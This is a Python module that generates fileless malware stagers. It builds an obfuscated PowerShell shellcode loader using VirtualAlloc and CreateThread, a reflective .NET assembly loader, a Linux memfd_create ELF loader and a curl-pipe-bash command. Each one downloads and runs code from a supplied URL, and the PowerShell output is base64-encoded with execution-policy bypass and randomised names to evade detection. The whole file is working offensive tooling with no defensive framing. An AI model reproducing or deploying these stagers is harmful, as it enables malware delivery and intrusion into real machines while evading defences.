"""
loader_engine.py — Reflective Shellcode Stager Generator

Generates PowerShell (Windows) and Bash (Linux) stager templates that:
  - Download a raw shellcode/PE blob from a URL
  - Load it into memory without touching disk (VirtualAlloc / memfd_create)
  - Execute it in the current process or a new thread

These are template generators only — they do not execute anything locally.
"""
import base64
import random
import string


def _rand_var(n=8):
    return random.choice(string.ascii_letters) + ''.join(
        random.choices(string.ascii_letters + string.digits, k=n-1)
    )


class LoaderEngine:

    @staticmethod
    def ps_shellcode_stager(shellcode_url: str, obfuscate: bool = True) -> str:
        """
        PowerShell stager: downloads raw shellcode bytes, allocates RWX memory
        via VirtualAlloc, copies shellcode, and executes via CreateThread.
        """
        vUrl  = _rand_var(); vWC   = _rand_var(); vSC   = _rand_var()
        vHnd  = _rand_var(); vMem  = _rand_var(); vPtr  = _rand_var()
        vThr  = _rand_var(); vCode = _rand_var(); vSize = _rand_var()

        code = f"""
$code = @"
using System;
using System.Runtime.InteropServices;
public class {_rand_var()} {{
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr id);
    [DllImport("kernel32")] public static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
}}
"@
Add-Type $code

${vWC}  = New-Object Net.WebClient
${vSC}  = ${vWC}.DownloadData('{shellcode_url}')
${vSize}= ${vSC}.Length
${vMem} = [{_rand_var()}]::VirtualAlloc([IntPtr]::Zero, [uint32]${vSize}, 0x3000, 0x40)
[Runtime.InteropServices.Marshal]::Copy(${vSC}, 0, ${vMem}, ${vSize})
${vThr} = [{_rand_var()}]::CreateThread([IntPtr]::Zero, 0, ${vMem}, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[{_rand_var()}]::WaitForSingleObject(${vThr}, 0xFFFFFFFF)
"""
        if obfuscate:
            encoded = base64.b64encode(code.encode('utf-16-le')).decode()
            return f'powershell -ep bypass -enc {encoded}'
        return code.strip()

    @staticmethod
    def ps_pe_stager(pe_url: str, obfuscate: bool = True) -> str:
        """
        PowerShell stager: downloads a PE (EXE/DLL) and reflectively loads it
        entirely in memory using Assembly.Load().
        Works for managed (.NET) assemblies.
        """
        vWC = _rand_var(); vPE = _rand_var(); vAsm = _rand_var()

        code = f"""
${vWC}  = New-Object Net.WebClient
${vPE}  = ${vWC}.DownloadData('{pe_url}')
${vAsm} = [Reflection.Assembly]::Load(${vPE})
${vAsm}.EntryPoint.Invoke($null, @(,[string[]]@()))
"""
        if obfuscate:
            encoded = base64.b64encode(code.encode('utf-16-le')).decode()
            return f'powershell -ep bypass -enc {encoded}'
        return code.strip()

    @staticmethod
    def bash_memfd_stager(elf_url: str) -> str:
        """
        Bash stager for Linux: downloads an ELF binary into a memfd (anonymous
        in-memory file) and executes it via /proc/self/fd/<fd>. 
        The ELF never touches disk.
        """
        return f"""python3 -c "
import urllib.request, os, ctypes, tempfile
data = urllib.request.urlopen('{elf_url}').read()
fd = ctypes.CDLL(None).memfd_create('', 1)
os.write(fd, data)
os.execve('/proc/self/fd/%d' % fd, ['stage'], os.environ)
" """

    @staticmethod
    def bash_curl_exec(url: str) -> str:
        """Simple curl | bash in-memory staging (no file drop)."""
        return f"bash -c \"$(curl -fsSL '{url}')\""

    @staticmethod
    def generate_all(url: str, platform: str = 'windows') -> dict:
        """
        Returns all relevant stager templates for the given platform.
        platform: 'windows' | 'linux' | 'both'
        """
        result = {}
        if platform in ('windows', 'both'):
            result['ps_shellcode_stager'] = LoaderEngine.ps_shellcode_stager(url)
            result['ps_pe_stager']        = LoaderEngine.ps_pe_stager(url)
        if platform in ('linux', 'both'):
            result['bash_memfd_stager']   = LoaderEngine.bash_memfd_stager(url)
            result['bash_curl_exec']      = LoaderEngine.bash_curl_exec(url)
        return result
